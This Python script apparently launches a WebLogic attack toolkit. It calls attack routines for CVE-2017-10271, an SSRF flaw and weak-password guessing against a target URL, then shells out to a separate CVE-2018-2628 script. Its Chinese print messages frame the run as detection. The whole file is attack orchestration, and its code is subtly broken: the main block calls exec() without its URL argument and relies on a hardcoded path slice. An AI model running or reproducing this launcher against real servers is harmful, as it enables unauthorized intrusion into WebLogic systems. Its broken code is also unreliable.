# -*- coding: utf-8 -*-
import weblogic.CVE_2017_10271
import weblogic.ssrf
import weblogic.weblogic_weakpasswd
import os

def exec(URL):
    weblogic.CVE_2017_10271.attack(URL)
    weblogic.ssrf.attack(URL)
    weblogic.weblogic_weakpasswd.attack(URL)

    print('[+]开始检测-Weblogic-CVE-2018-2628。[+]')
    #切换工作路径
    os.chdir(os.path.realpath(__file__)[:38])
    os.system("py -2 CVE_2018_2628.py") 
    print('[+]检测结束-Weblogic-CVE-2018-2628。[+]')


if __name__ == "__main__":
    exec()
